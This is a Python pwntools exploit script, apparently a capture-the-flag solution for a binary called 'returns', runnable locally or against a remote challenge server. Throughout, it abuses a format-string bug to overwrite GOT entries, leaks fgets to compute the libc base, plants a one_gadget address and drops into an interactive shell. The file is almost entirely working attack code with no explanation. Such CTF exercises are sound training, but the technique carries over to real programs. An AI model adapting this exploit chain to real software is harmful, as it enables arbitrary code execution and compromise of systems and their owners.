from pwn import *

server="local"
if server=="local":
    sh = process('./returns')
    one_gadget=0x44adf  # constraint rax==NULL
    fgets_offset=0x701b0
else:
    sh = remote('shell.actf.co', 19307)
    one_gadget=0x45216  # constraint rax==NULL
    fgets_offset=0x6dad0

loop=0x40122E
puts_got=0x404018
fgets_got=0x404040
getegid_got=0x404050
mov_eax_0_getegid=0x4011BD

def write(address, what, index, offset=12):
    payload="A"*8
    payload+=("%"+str(what-offset)+"x%"+str(index)+"$hn").rjust(16)
    payload+=p64(address)[:3]+"4"+"\x00"*4  # for some reason last char is omitted
    sh.sendline(payload)
    sh.recv()

def leak(address, index):
    payload="A"*8
    payload+=("|%"+str(index)+"$s|").rjust(8)
    payload+="porsukuk"
    payload+=p64(address)[:3]+"4"+"\x00"*4  # for some reason last char is omitted
    sh.sendline(payload)
    data   = sh.recvuntil("porsukuk")
    fgets  = data.split('|')[1]
    return u64(fgets.ljust(8, "\x00"))
    
raw_input("awaiting for orders")
sh.recv()
write(puts_got, 0x122E, index=11)
fgets_addr=leak(fgets_got, index=12)
print "fgets at: "+hex(fgets_addr)
libc_base=fgets_addr-fgets_offset
print "base at: "+hex(libc_base)
one_gadget_addr=libc_base+one_gadget
print "one_gadget at: "+hex(one_gadget_addr)
write(getegid_got, int("0x"+hex(one_gadget_addr)[-4:],16), offset=11, index=13)
write(getegid_got+2, int("0x"+hex(one_gadget_addr)[-8:-4],16), offset=11, index=14)
write(getegid_got+4, int("0x"+hex(one_gadget_addr)[-12:-8],16), offset=11, index=15)
getegid_addr=leak(getegid_got, index=16)
print "getegid modified to: "+hex(getegid_addr)
write(puts_got, 0x11BD, index=17)

sh.interactive()
